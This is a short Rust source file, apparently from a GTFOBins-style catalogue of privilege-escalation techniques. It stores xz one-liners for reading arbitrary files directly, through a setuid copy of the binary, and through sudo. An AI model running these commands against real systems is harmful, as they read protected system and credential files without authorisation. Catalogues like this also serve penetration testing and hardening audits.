pub static BIN_NAME: &'static str = "xz";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    xz -c "$LFILE" | xz -d
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which xz) .

    LFILE=file_to_read
    ./xz -c "$LFILE" | xz -d
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo xz -c "$LFILE" | xz -d
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
